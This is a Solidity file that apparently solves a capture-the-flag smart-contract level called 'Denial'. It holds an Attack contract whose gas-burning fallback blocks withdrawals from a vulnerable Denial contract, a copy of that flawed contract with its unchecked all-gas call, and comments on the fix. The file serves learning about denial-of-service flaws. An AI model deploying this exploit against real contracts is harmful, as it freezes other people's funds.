// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
  Denial contractTarget;

  constructor(address payable _address) public payable {
    contractTarget = Denial(_address);
  }

  function attack() public {
    contractTarget.setWithdrawPartner(address(this));
  }

  // partner.call will call the this fallback function and it will consumes all gas.
  fallback() payable external {
    assert(false);
  }
}

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}(""); // low level call with remaining gas ("") sent in the transaction, opening up exploit 
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

/*
  Result

  This level demostrates that external calls to unknow contracts can still create
  denial of sevice attack vector if a fixed amount of gas in not specified.

  if you are using a low level call to continue executing in the event an external call revert,
  ensure that you specify a fixed gas stipend. For examplac call.gas(100000).value().

  Typically one should followthe check-effects-interactions pattern (https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern)
  to avoid reentrancy attack, there can be otehr circumstances (such as multiple external calls at the end of a function)
  where issues such as this can aris

  Note: An external CALL can use at most 63/64 of the gas cureently available at the time of the CALL.
  Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas
  (i.e. one such that 1/64 of  the gas is capable of completing the remaining opcodes in the parent call)
  can be used to mitigate this particular attack.

  What need to fixed in Denial contract?
  1. use check-effects-interactions pattern for 
    - add checking the amount transferred
  2. Low level 'call' need to specify the amount of gas
    - receiver.call.gas(10000).value();
*/